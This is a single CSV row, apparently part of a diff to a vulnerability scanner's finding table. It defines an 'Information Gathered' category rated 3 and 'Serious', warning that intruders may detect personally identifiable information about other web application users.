+"Information Gathered","3","Serious","Intruders may be able to detect highly sensitive data, such as personally identifiable information (PII) about other users of the web application."
